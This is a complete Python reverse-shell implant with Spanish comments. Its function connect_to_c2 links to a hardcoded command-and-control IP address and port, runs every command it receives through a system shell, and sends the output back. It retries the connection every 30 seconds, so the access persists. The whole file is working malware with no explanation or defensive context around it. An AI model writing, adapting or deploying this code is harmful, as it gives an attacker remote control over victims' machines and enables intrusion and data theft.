import socket
import subprocess
import time

def connect_to_c2():
    c2_host = '177.228.108.140'
    c2_port = 5001
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((c2_host, c2_port))
            
            while True:
                command = s.recv(1024).decode('utf-8', errors='ignore')
                if not command:
                    break
                
                if command.strip().lower() == 'exit':
                    break

                # Ejecutar comando y capturar la salida
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value, stderr_value = proc.communicate()
                
                # Enviar de vuelta tanto stdout como stderr
                output_str = stdout_value.decode('utf-8', errors='ignore') + stderr_value.decode('utf-8', errors='ignore')
                if not output_str:
                    output_str = "[+] Comando ejecutado sin salida.\n"
                
                s.send(output_str.encode('utf-8'))
            
            s.close()

        except Exception as e:
            # Si la conexion falla, esperar y reintentar
            print(f"Error de conexion: {e}, reintentando en 30 segundos...")
            time.sleep(30)

if __name__ == "__main__":
    connect_to_c2() 